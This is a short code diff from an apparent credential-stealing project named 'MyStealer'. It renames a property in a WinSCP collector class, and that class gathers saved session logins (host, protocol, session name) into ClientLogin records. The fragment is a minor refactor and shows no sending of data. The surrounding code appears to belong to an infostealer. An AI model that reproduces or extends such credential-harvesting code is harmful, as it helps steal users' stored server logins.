@@ -14,7 +14,7 @@ namespace MyStealer.Collector.Client
     /// </summary>
     public class WinScp : ClientCollector
     {
-        public override string ModuleName => "WinSCP";
+        public override string Name => "WinSCP";
 
         public override bool IsAvailable()
         {
@@ -101,7 +101,7 @@ namespace MyStealer.Collector.Client
 
                             set.Add(new ClientLogin
                             {
-                                ProgramName = ModuleName,
+                                ProgramName = Name,
                                 Name = sessionKeyName,
                                 Protocol = protocol,
                                 Host = host,
